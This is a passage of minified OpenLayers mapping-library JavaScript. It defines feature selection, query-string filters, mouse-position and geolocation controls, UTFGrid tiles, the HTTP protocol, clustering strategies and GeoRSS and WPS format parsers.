this.handlers)this.handlers[a].activate();\nreturn OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){if(this.active)for(var a in this.handlers)this.handlers[a].deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},selectClick:function(a){var b=this.pixelToBounds(a.xy);this.setModifiers(a);this.request(b,{single:this.single})},selectBox:function(a){var b;if(a instanceof OpenLayers.Bounds)b=this.map.getLonLatFromPixel({x:a.left,y:a.bottom}),a=this.map.getLonLatFromPixel({x:a.right,\ny:a.top}),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);else{if(this.click)return;b=this.pixelToBounds(a)}this.setModifiers(this.handlers.box.dragHandler.evt);this.request(b)},selectHover:function(a){a=this.pixelToBounds(a.xy);this.request(a,{single:!0,hover:!0})},cancelHover:function(){this.hoverResponse&&(this.protocol.abort(this.hoverResponse),this.hoverResponse=null,OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olCursorWait\"))},request:function(a,b){b=b||{};var c=new OpenLayers.Filter.Spatial({type:this.filterType,\nvalue:a});OpenLayers.Element.addClass(this.map.viewPortDiv,\"olCursorWait\");c=this.protocol.read({maxFeatures:!0==b.single?this.maxFeatures:void 0,filter:c,callback:function(c){c.success()&&(c.features.length?!0==b.single?this.selectBestFeature(c.features,a.getCenterLonLat(),b):this.select(c.features):b.hover?this.hoverSelect():(this.events.triggerEvent(\"clickout\"),this.clickout&&this.unselectAll()));OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olCursorWait\")},scope:this});!0==b.hover&&(this.hoverResponse=\nc)},selectBestFeature:function(a,b,c){c=c||{};if(a.length){b=new OpenLayers.Geometry.Point(b.lon,b.lat);for(var d,e,f,g=Number.MAX_VALUE,h=0;h<a.length&&!(d=a[h],d.geometry&&(f=b.distanceTo(d.geometry,{edge:!1}),f<g&&(g=f,e=d,0==g)));++h);!0==c.hover?this.hoverSelect(e):this.select(e||a)}},setModifiers:function(a){this.modifiers={multiple:this.multiple||this.multipleKey&&a[this.multipleKey],toggle:this.toggle||this.toggleKey&&a[this.toggleKey]}},select:function(a){this.modifiers.multiple||this.modifiers.toggle||\nthis.unselectAll();OpenLayers.Util.isArray(a)||(a=[a]);var b=this.events.triggerEvent(\"beforefeaturesselected\",{features:a});if(!1!==b){for(var c=[],d,e=0,f=a.length;e<f;++e)d=a[e],this.features[d.fid||d.id]?this.modifiers.toggle&&this.unselect(this.features[d.fid||d.id]):(b=this.events.triggerEvent(\"beforefeatureselected\",{feature:d}),!1!==b&&(this.features[d.fid||d.id]=d,c.push(d),this.events.triggerEvent(\"featureselected\",{feature:d})));this.events.triggerEvent(\"featuresselected\",{features:c})}},\nhoverSelect:function(a){var b=a?a.fid||a.id:null,c=this.hoverFeature?this.hoverFeature.fid||this.hoverFeature.id:null;c&&c!=b&&(this.events.triggerEvent(\"outfeature\",{feature:this.hoverFeature}),this.hoverFeature=null);b&&b!=c&&(this.events.triggerEvent(\"hoverfeature\",{feature:a}),this.hoverFeature=a)},unselect:function(a){delete this.features[a.fid||a.id];this.events.triggerEvent(\"featureunselected\",{feature:a})},unselectAll:function(){for(var a in this.features)this.unselect(this.features[a])},\nsetMap:function(a){for(var b in this.handlers)this.handlers[b].setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},pixelToBounds:function(a){var b=a.add(-this.clickTolerance/2,this.clickTolerance/2);a=a.add(this.clickTolerance/2,-this.clickTolerance/2);b=this.map.getLonLatFromPixel(b);a=this.map.getLonLatFromPixel(a);return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)},CLASS_NAME:\"OpenLayers.Control.GetFeature\"});OpenLayers.Format.QueryStringFilter=function(){function a(a){a=a.replace(/%/g,\"\\\\%\");a=a.replace(/\\\\\\\\\\.(\\*)?/g,function(a,b){return b?a:\"\\\\\\\\_\"});a=a.replace(/\\\\\\\\\\.\\*/g,\"\\\\\\\\%\");a=a.replace(/(\\\\)?\\.(\\*)?/g,function(a,b,c){return b||c?a:\"_\"});a=a.replace(/(\\\\)?\\.\\*/g,function(a,b){return b?a:\"%\"});a=a.replace(/\\\\\\./g,\".\");return a=a.replace(/(\\\\)?\\\\\\*/g,function(a,b){return b?a:\"*\"})}var b={};b[OpenLayers.Filter.Comparison.EQUAL_TO]=\"eq\";b[OpenLayers.Filter.Comparison.NOT_EQUAL_TO]=\"ne\";b[OpenLayers.Filter.Comparison.LESS_THAN]=\n\"lt\";b[OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO]=\"lte\";b[OpenLayers.Filter.Comparison.GREATER_THAN]=\"gt\";b[OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO]=\"gte\";b[OpenLayers.Filter.Comparison.LIKE]=\"ilike\";return OpenLayers.Class(OpenLayers.Format,{wildcarded:!1,srsInBBOX:!1,write:function(c,d){d=d||{};var e=c.CLASS_NAME,e=e.substring(e.lastIndexOf(\".\")+1);switch(e){case \"Spatial\":switch(c.type){case OpenLayers.Filter.Spatial.BBOX:d.bbox=c.value.toArray();this.srsInBBOX&&c.projection&&\nd.bbox.push(c.projection.getCode());break;case OpenLayers.Filter.Spatial.DWITHIN:d.tolerance=c.distance;case OpenLayers.Filter.Spatial.WITHIN:d.lon=c.value.x;d.lat=c.value.y;break;default:OpenLayers.Console.warn(\"Unknown spatial filter type \"+c.type)}break;case \"Comparison\":e=b[c.type];if(void 0!==e){var f=c.value;c.type==OpenLayers.Filter.Comparison.LIKE&&(f=a(f),this.wildcarded&&(f=\"%\"+f+\"%\"));d[c.property+\"__\"+e]=f;d.queryable=d.queryable||[];d.queryable.push(c.property)}else OpenLayers.Console.warn(\"Unknown comparison filter type \"+\nc.type);break;case \"Logical\":if(c.type===OpenLayers.Filter.Logical.AND)for(e=0,f=c.filters.length;e<f;e++)d=this.write(c.filters[e],d);else OpenLayers.Console.warn(\"Unsupported logical filter type \"+c.type);break;default:OpenLayers.Console.warn(\"Unknown filter type \"+e)}return d},CLASS_NAME:\"OpenLayers.Format.QueryStringFilter\"})}();OpenLayers.Control.MousePosition=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,element:null,prefix:\"\",separator:\", \",suffix:\"\",numDigits:5,granularity:10,emptyString:null,lastXy:null,displayProjection:null,destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.events.register(\"mousemove\",this,this.redraw),this.map.events.register(\"mouseout\",this,this.reset),\nthis.redraw(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.map.events.unregister(\"mousemove\",this,this.redraw),this.map.events.unregister(\"mouseout\",this,this.reset),this.element.innerHTML=\"\",!0):!1},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.div.left=\"\",this.div.top=\"\",this.element=this.div);return this.div},redraw:function(a){var b;if(null==a)this.reset();else if(null==this.lastXy||Math.abs(a.xy.x-\nthis.lastXy.x)>this.granularity||Math.abs(a.xy.y-this.lastXy.y)>this.granularity)this.lastXy=a.xy;else if(b=this.map.getLonLatFromPixel(a.xy))this.displayProjection&&b.transform(this.map.getProjectionObject(),this.displayProjection),this.lastXy=a.xy,a=this.formatOutput(b),a!=this.element.innerHTML&&(this.element.innerHTML=a)},reset:function(a){null!=this.emptyString&&(this.element.innerHTML=this.emptyString)},formatOutput:function(a){var b=parseInt(this.numDigits);return this.prefix+a.lon.toFixed(b)+\nthis.separator+a.lat.toFixed(b)+this.suffix},CLASS_NAME:\"OpenLayers.Control.MousePosition\"});OpenLayers.Control.Geolocate=OpenLayers.Class(OpenLayers.Control,{geolocation:null,available:\"geolocation\"in navigator,bind:!0,watch:!1,geolocationOptions:null,destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){this.available&&!this.geolocation&&(this.geolocation=navigator.geolocation);return this.geolocation?OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.watch?this.watchId=this.geolocation.watchPosition(OpenLayers.Function.bind(this.geolocate,\nthis),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions):this.getCurrentLocation(),!0):!1:(this.events.triggerEvent(\"locationuncapable\"),!1)},deactivate:function(){this.active&&null!==this.watchId&&this.geolocation.clearWatch(this.watchId);return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},geolocate:function(a){var b=(new OpenLayers.LonLat(a.coords.longitude,a.coords.latitude)).transform(new OpenLayers.Projection(\"EPSG:4326\"),this.map.getProjectionObject());this.bind&&\nthis.map.setCenter(b);this.events.triggerEvent(\"locationupdated\",{position:a,point:new OpenLayers.Geometry.Point(b.lon,b.lat)})},getCurrentLocation:function(){if(!this.active||this.watch)return!1;this.geolocation.getCurrentPosition(OpenLayers.Function.bind(this.geolocate,this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions);return!0},failure:function(a){this.events.triggerEvent(\"locationfailed\",{error:a})},CLASS_NAME:\"OpenLayers.Control.Geolocate\"});OpenLayers.Tile.UTFGrid=OpenLayers.Class(OpenLayers.Tile,{url:null,utfgridResolution:2,json:null,format:null,destroy:function(){this.clear();OpenLayers.Tile.prototype.destroy.apply(this,arguments)},draw:function(){var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);if(a)if(this.isLoading?(this.abortLoading(),this.events.triggerEvent(\"reload\")):(this.isLoading=!0,this.events.triggerEvent(\"loadstart\")),this.url=this.layer.getURL(this.bounds),this.layer.useJSONP){var b=new OpenLayers.Protocol.Script({url:this.url,\ncallback:function(a){this.isLoading=!1;this.events.triggerEvent(\"loadend\");this.json=a.data},scope:this});b.read();this.request=b}else this.request=OpenLayers.Request.GET({url:this.url,callback:function(a){this.isLoading=!1;this.events.triggerEvent(\"loadend\");200===a.status&&this.parseData(a.responseText)},scope:this});else this.unload();return a},abortLoading:function(){this.request&&(this.request.abort(),delete this.request);this.isLoading=!1},getFeatureInfo:function(a,b){var c=null;if(this.json){var d=\nthis.getFeatureId(a,b);null!==d&&(c={id:d,data:this.json.data[d]})}return c},getFeatureId:function(a,b){var c=null;if(this.json){var d=this.utfgridResolution,d=this.json.grid[Math.floor(b/d)].charCodeAt(Math.floor(a/d)),d=this.indexFromCharCode(d),e=this.json.keys;!isNaN(d)&&d in e&&(c=e[d])}return c},indexFromCharCode:function(a){93<=a&&a--;35<=a&&a--;return a-32},parseData:function(a){this.format||(this.format=new OpenLayers.Format.JSON);this.json=this.format.read(a)},clear:function(){this.json=\nnull},CLASS_NAME:\"OpenLayers.Tile.UTFGrid\"});OpenLayers.Protocol.HTTP=OpenLayers.Class(OpenLayers.Protocol,{url:null,headers:null,params:null,callback:null,scope:null,readWithPOST:!1,updateWithPOST:!1,deleteWithPOST:!1,wildcarded:!1,srsInBBOX:!1,initialize:function(a){a=a||{};this.params={};this.headers={};OpenLayers.Protocol.prototype.initialize.apply(this,arguments);if(!this.filterToParams&&OpenLayers.Format.QueryStringFilter){var b=new OpenLayers.Format.QueryStringFilter({wildcarded:this.wildcarded,srsInBBOX:this.srsInBBOX});this.filterToParams=\nfunction(a,d){return b.write(a,d)}}},destroy:function(){this.headers=this.params=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=a||{};a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a=OpenLayers.Util.applyDefaults(a,this.options);a.filter&&this.filterToParams&&(a.params=this.filterToParams(a.filter,a.params));var b=void 0!==a.readWithPOST?a.readWithPOST:this.readWithPOST,c=new OpenLayers.Protocol.Response({requestType:\"read\"});\nb?(b=a.headers||{},b[\"Content-Type\"]=\"application/x-www-form-urlencoded\",c.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,c,a),data:OpenLayers.Util.getParameterString(a.params),headers:b})):c.priv=OpenLayers.Request.GET({url:a.url,callback:this.createCallback(this.handleRead,c,a),params:a.params,headers:a.headers});return c},handleRead:function(a,b){this.handleResponse(a,b)},create:function(a,b){b=OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response({reqFeatures:a,\nrequestType:\"create\"});c.priv=OpenLayers.Request.POST({url:b.url,callback:this.createCallback(this.handleCreate,c,b),headers:b.headers,data:this.format.write(a)});return c},handleCreate:function(a,b){this.handleResponse(a,b)},update:function(a,b){b=b||{};var c=b.url||a.url||this.options.url+\"/\"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response({reqFeatures:a,requestType:\"update\"});d.priv=OpenLayers.Request[this.updateWithPOST?\"POST\":\"PUT\"]({url:c,callback:this.createCallback(this.handleUpdate,\nd,b),headers:b.headers,data:this.format.write(a)});return d},handleUpdate:function(a,b){this.handleResponse(a,b)},\"delete\":function(a,b){b=b||{};var c=b.url||a.url||this.options.url+\"/\"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response({reqFeatures:a,requestType:\"delete\"}),e=this.deleteWithPOST?\"POST\":\"DELETE\",c={url:c,callback:this.createCallback(this.handleDelete,d,b),headers:b.headers};this.deleteWithPOST&&(c.data=this.format.write(a));d.priv=OpenLayers.Request[e](c);\nreturn d},handleDelete:function(a,b){this.handleResponse(a,b)},handleResponse:function(a,b){var c=a.priv;b.callback&&(200<=c.status&&300>c.status?(\"delete\"!=a.requestType&&(a.features=this.parseFeatures(c)),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,b.callback.call(b.scope,a))},parseFeatures:function(a){var b=a.responseXML;b&&b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},commit:function(a,b){function c(a){for(var b=\na.features?a.features.length:0,c=Array(b),e=0;e<b;++e)c[e]=a.features[e].fid;r.insertIds=c;d.apply(this,[a])}function d(a){this.callUserCallback(a,b);q=q&&a.success();f++;f>=p&&b.callback&&(r.code=q?OpenLayers.Protocol.Response.SUCCESS:OpenLayers.Protocol.Response.FAILURE,b.callback.apply(b.scope,[r]))}b=OpenLayers.Util.applyDefaults(b,this.options);var e=[],f=0,g={};g[OpenLayers.State.INSERT]=[];g[OpenLayers.State.UPDATE]=[];g[OpenLayers.State.DELETE]=[];for(var h,k,l=[],m=0,n=a.length;m<n;++m)if(h=\na[m],k=g[h.state])k.push(h),l.push(h);var p=(0<g[OpenLayers.State.INSERT].length?1:0)+g[OpenLayers.State.UPDATE].length+g[OpenLayers.State.DELETE].length,q=!0,r=new OpenLayers.Protocol.Response({reqFeatures:l});h=g[OpenLayers.State.INSERT];0<h.length&&e.push(this.create(h,OpenLayers.Util.applyDefaults({callback:c,scope:this},b.create)));h=g[OpenLayers.State.UPDATE];for(m=h.length-1;0<=m;--m)e.push(this.update(h[m],OpenLayers.Util.applyDefaults({callback:d,scope:this},b.update)));h=g[OpenLayers.State.DELETE];\nfor(m=h.length-1;0<=m;--m)e.push(this[\"delete\"](h[m],OpenLayers.Util.applyDefaults({callback:d,scope:this},b[\"delete\"])));return e},abort:function(a){a&&a.priv.abort()},callUserCallback:function(a,b){var c=b[a.requestType];c&&c.callback&&c.callback.call(c.scope,a)},CLASS_NAME:\"OpenLayers.Protocol.HTTP\"});OpenLayers.Strategy.Cluster=OpenLayers.Class(OpenLayers.Strategy,{distance:20,threshold:null,features:null,clusters:null,clustering:!1,resolution:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on({beforefeaturesadded:this.cacheFeatures,featuresremoved:this.clearCache,moveend:this.cluster,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&&(this.clearCache(),this.layer.events.un({beforefeaturesadded:this.cacheFeatures,\nfeaturesremoved:this.clearCache,moveend:this.cluster,scope:this}));return a},cacheFeatures:function(a){var b=!0;this.clustering||(this.clearCache(),this.features=a.features,this.cluster(),b=!1);return b},clearCache:function(){this.clustering||(this.features=null)},cluster:function(a){if((!a||a.zoomChanged)&&this.features&&(a=this.layer.map.getResolution(),a!=this.resolution||!this.clustersExist())){this.resolution=a;a=[];for(var b,c,d,e=0;e<this.features.length;++e)if(b=this.features[e],b.geometry){c=\n!1;for(var f=a.length-1;0<=f;--f)if(d=a[f],this.shouldCluster(d,b)){this.addToCluster(d,b);c=!0;break}c||a.push(this.createCluster(this.features[e]))}this.clustering=!0;this.layer.removeAllFeatures();this.clustering=!1;if(0<a.length){if(1<this.threshold)for(b=a.slice(),a=[],e=0,d=b.length;e<d;++e)c=b[e],c.attributes.count<this.threshold?Array.prototype.push.apply(a,c.cluster):a.push(c);this.clustering=!0;this.layer.addFeatures(a);this.clustering=!1}this.clusters=a}},clustersExist:function(){var a=\n!1;if(this.clusters&&0<this.clusters.length&&this.clusters.length==this.layer.features.length)for(var a=!0,b=0;b<this.clusters.length;++b)if(this.clusters[b]!=this.layer.features[b]){a=!1;break}return a},shouldCluster:function(a,b){var c=a.geometry.getBounds().getCenterLonLat(),d=b.geometry.getBounds().getCenterLonLat();return Math.sqrt(Math.pow(c.lon-d.lon,2)+Math.pow(c.lat-d.lat,2))/this.resolution<=this.distance},addToCluster:function(a,b){a.cluster.push(b);a.attributes.count+=1},createCluster:function(a){var b=\na.geometry.getBounds().getCenterLonLat(),b=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(b.lon,b.lat),{count:1});b.cluster=[a];return b},CLASS_NAME:\"OpenLayers.Strategy.Cluster\"});OpenLayers.Strategy.Filter=OpenLayers.Class(OpenLayers.Strategy,{filter:null,cache:null,caching:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);a&&(this.cache=[],this.layer.events.on({beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this}));return a},deactivate:function(){this.cache=null;this.layer&&this.layer.events&&this.layer.events.un({beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this});\nreturn OpenLayers.Strategy.prototype.deactivate.apply(this,arguments)},handleAdd:function(a){if(!this.caching&&this.filter){var b=a.features;a.features=[];for(var c,d=0,e=b.length;d<e;++d)c=b[d],this.filter.evaluate(c)?a.features.push(c):this.cache.push(c)}},handleRemove:function(a){this.caching||(this.cache=[])},setFilter:function(a){this.filter=a;a=this.cache;this.cache=[];this.handleAdd({features:this.layer.features});0<this.cache.length&&(this.caching=!0,this.layer.removeFeatures(this.cache.slice()),\nthis.caching=!1);0<a.length&&(a={features:a},this.handleAdd(a),0<a.features.length&&(this.caching=!0,this.layer.addFeatures(a.features),this.caching=!1))},CLASS_NAME:\"OpenLayers.Strategy.Filter\"});OpenLayers.Protocol.SOS=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.SOS.DEFAULTS);var b=OpenLayers.Protocol.SOS[\"v\"+a.version.replace(/\\./g,\"_\")];if(!b)throw\"Unsupported SOS version: \"+a.version;return new b(a)};OpenLayers.Protocol.SOS.DEFAULTS={version:\"1.0.0\"};OpenLayers.Format.WFSDescribeFeatureType=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\\s*|\\s*$/g},namespaces:{xsd:\"http://www.w3.org/2001/XMLSchema\"},readers:{xsd:{schema:function(a,b){var c=[],d={},e,f;this.readChildNodes(a,{complexTypes:c,customTypes:d});var g=a.attributes,h,k;e=0;for(f=g.length;e<f;++e)h=g[e],k=h.name,0===k.indexOf(\"xmlns\")?this.setNamespace(k.split(\":\")[1]||\"\",h.value):b[k]=h.value;b.featureTypes=c;b.targetPrefix=this.namespaceAlias[b.targetNamespace];e=0;for(f=\nc.length;e<f;++e)g=c[e],h=d[g.typeName],d[g.typeName]&&(g.typeName=h.name)},complexType:function(a,b){var c={typeName:a.getAttribute(\"name\")};this.readChildNodes(a,c);b.complexTypes.push(c)},complexContent:function(a,b){this.readChildNodes(a,b)},extension:function(a,b){this.readChildNodes(a,b)},sequence:function(a,b){var c={elements:[]};this.readChildNodes(a,c);b.properties=c.elements},element:function(a,b){var c;if(b.elements){var d={};c=a.attributes;for(var e,f=0,g=c.length;f<g;++f)e=c[f],d[e.name]=\ne.value;c=d.type;c||(c={},this.readChildNodes(a,c),d.restriction=c,d.type=c.base);d.localType=(c.base||c).split(\":\").pop();b.elements.push(d);this.readChildNodes(a,d)}b.complexTypes&&(c=a.getAttribute(\"type\"),d=c.split(\":\").pop(),b.customTypes[d]={name:a.getAttribute(\"name\"),type:c})},annotation:function(a,b){b.annotation={};this.readChildNodes(a,b.annotation)},appinfo:function(a,b){b.appinfo||(b.appinfo=[]);b.appinfo.push(this.getChildValue(a))},documentation:function(a,b){b.documentation||(b.documentation=\n[]);var c=this.getChildValue(a);b.documentation.push({lang:a.getAttribute(\"xml:lang\"),textContent:c.replace(this.regExes.trimSpace,\"\")})},simpleType:function(a,b){this.readChildNodes(a,b)},restriction:function(a,b){b.base=a.getAttribute(\"base\");this.readRestriction(a,b)}}},readRestriction:function(a,b){for(var c=a.childNodes,d,e,f=0,g=c.length;f<g;++f)d=c[f],1==d.nodeType&&(e=d.nodeName.split(\":\").pop(),d=d.getAttribute(\"value\"),b[e]?(\"string\"==typeof b[e]&&(b[e]=[b[e]]),b[e].push(d)):b[e]=d)},read:function(a){\"string\"==\ntypeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};if(\"ExceptionReport\"===a.nodeName.split(\":\").pop()){var c=new OpenLayers.Format.OGCExceptionReport;b.error=c.read(a)}else this.readNode(a,b);return b},CLASS_NAME:\"OpenLayers.Format.WFSDescribeFeatureType\"});OpenLayers.Format.GeoRSS=OpenLayers.Class(OpenLayers.Format.XML,{rssns:\"http://backend.userland.com/rss2\",featureNS:\"http://mapserver.gis.umn.edu/mapserver\",georssns:\"http://www.georss.org/georss\",geons:\"http://www.w3.org/2003/01/geo/wgs84_pos#\",featureTitle:\"Untitled\",featureDescription:\"No Description\",gmlParser:null,xy:!1,createGeometryFromItem:function(a){var b=this.getElementsByTagNameNS(a,this.georssns,\"point\"),c=this.getElementsByTagNameNS(a,this.geons,\"lat\"),d=this.getElementsByTagNameNS(a,\nthis.geons,\"long\"),e=this.getElementsByTagNameNS(a,this.georssns,\"line\"),f=this.getElementsByTagNameNS(a,this.georssns,\"polygon\"),g=this.getElementsByTagNameNS(a,this.georssns,\"where\");a=this.getElementsByTagNameNS(a,this.georssns,\"box\");if(0<b.length||0<c.length&&0<d.length){0<b.length?(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\\s+/),2!=c.length&&(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\\s*,\\s*/))):c=[parseFloat(c[0].firstChild.nodeValue),parseFloat(d[0].firstChild.nodeValue)];\nvar h=new OpenLayers.Geometry.Point(c[1],c[0])}else if(0<e.length){c=OpenLayers.String.trim(this.getChildValue(e[0])).split(/\\s+/);d=[];e=0;for(f=c.length;e<f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.LineString(d)}else if(0<f.length){c=OpenLayers.String.trim(this.getChildValue(f[0])).split(/\\s+/);d=[];e=0;for(f=c.length;e<f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])}else 0<\ng.length?(this.gmlParser||(this.gmlParser=new OpenLayers.Format.GML({xy:this.xy})),h=this.gmlParser.parseFeature(g[0]).geometry):0<a.length&&(c=OpenLayers.String.trim(a[0].firstChild.nodeValue).split(/\\s+/),d=[],3<c.length&&(b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b)),h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)]));\nh&&(this.internalProjection&&this.externalProjection)&&h.transform(this.externalProjection,this.internalProjection);return h},createFeatureFromItem:function(a){var b=this.createGeometryFromItem(a),c=this._getChildValue(a,\"*\",\"title\",this.featureTitle),d=this._getChildValue(a,\"*\",\"description\",this._getChildValue(a,\"*\",\"content\",this._getChildValue(a,\"*\",\"summary\",this.featureDescription))),e=this._getChildValue(a,\"*\",\"link\");if(!e)try{e=this.getElementsByTagNameNS(a,\"*\",\"link\")[0].getAttribute(\"href\")}catch(f){e=\nnull}a=this._getChildValue(a,\"*\",\"id\",null);b=new OpenLayers.Feature.Vector(b,{title:c,description:d,link:e});b.fid=a;return b},_getChildValue:function(a,b,c,d){return(a=this.getElementsByTagNameNS(a,b,c))&&a[0]&&a[0].firstChild&&a[0].firstChild.nodeValue?this.getChildValue(a[0]):void 0==d?\"\":d},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null,b=this.getElementsByTagNameNS(a,\"*\",\"item\");0==b.length&&(b=this.getElementsByTagNameNS(a,\"*\",\"entry\"));\na=b.length;for(var c=Array(a),d=0;d<a;d++)c[d]=this.createFeatureFromItem(b[d]);return c},write:function(a){var b;if(OpenLayers.Util.isArray(a)){b=this.createElementNS(this.rssns,\"rss\");for(var c=0,d=a.length;c<d;c++)b.appendChild(this.createFeatureXML(a[c]))}else b=this.createFeatureXML(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.rssns,\"item\"),d=this.createElementNS(this.rssns,\"title\");\nd.appendChild(this.createTextNode(a.attributes.title?a.attributes.title:\"\"));var e=this.createElementNS(this.rssns,\"description\");e.appendChild(this.createTextNode(a.attributes.description?a.attributes.description:\"\"));c.appendChild(d);c.appendChild(e);a.attributes.link&&(d=this.createElementNS(this.rssns,\"link\"),d.appendChild(this.createTextNode(a.attributes.link)),c.appendChild(d));for(var f in a.attributes)\"link\"!=f&&(\"title\"!=f&&\"description\"!=f)&&(d=this.createTextNode(a.attributes[f]),e=f,-1!=\nf.search(\":\")&&(e=f.split(\":\")[1]),e=this.createElementNS(this.featureNS,\"feature:\"+e),e.appendChild(d),c.appendChild(e));c.appendChild(b);return c},buildGeometryNode:function(a){this.internalProjection&&this.externalProjection&&(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b;if(\"OpenLayers.Geometry.Polygon\"==a.CLASS_NAME)b=this.createElementNS(this.georssns,\"georss:polygon\"),b.appendChild(this.buildCoordinatesNode(a.components[0]));else if(\"OpenLayers.Geometry.LineString\"==\na.CLASS_NAME)b=this.createElementNS(this.georssns,\"georss:line\"),b.appendChild(this.buildCoordinatesNode(a));else if(\"OpenLayers.Geometry.Point\"==a.CLASS_NAME)b=this.createElementNS(this.georssns,\"georss:point\"),b.appendChild(this.buildCoordinatesNode(a));else throw\"Couldn't parse \"+a.CLASS_NAME;return b},buildCoordinatesNode:function(a){var b=null;a.components&&(b=a.components);if(b){a=b.length;for(var c=Array(a),d=0;d<a;d++)c[d]=b[d].y+\" \"+b[d].x;b=c.join(\" \")}else b=a.y+\" \"+a.x;return this.createTextNode(b)},\nCLASS_NAME:\"OpenLayers.Format.GeoRSS\"});OpenLayers.Format.WPSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.0.0\",CLASS_NAME:\"OpenLayers.Format.WPSCapabilities\"});OpenLayers.Format.WPSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:\"http://www.opengis.net/ows/1.1\",wps:\"http://www.opengis.net/wps/1.0.0\",xlink:\"http://www.w3.org/1999/xlink\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);\nvar b={};this.readNode(a,b);return b},readers:{wps:{Capabilities:function(a,b){this.readChildNodes(a,b)},ProcessOfferings:function(a,b){b.processOfferings={};this.readChildNodes(a,b.processOfferings)},Process:function(a,b){var c={processVersion:this.getAttributeNS(a,this.namespaces.wps,\"processVersion\")};this.readChildNodes(a,c);b[c.identifier]=c},Languages:function(a,b){b.languages=[];this.readChildNodes(a,b.languages)},Default:function(a,b){var c={isDefault:!0};this.readChildNodes(a,c);b.push(c)},\nSupported:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:\"OpenLayers.Format.WPSCapabilities.v1_0_0\"});OpenLayers.Control.PinchZoom=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,pinchOrigin:null,currentCenter:null,autoActivate:!0,preserveCenter:!1,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,arguments);this.handler=new OpenLayers.Handler.Pinch(this,{start:this.pinchStart,move:this.pinchMove,done:this.pinchDone},this.handlerOptions)},pinchStart:function(a,b){var c=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy;this.currentCenter=\nthis.pinchOrigin=c},pinchMove:function(a,b){var 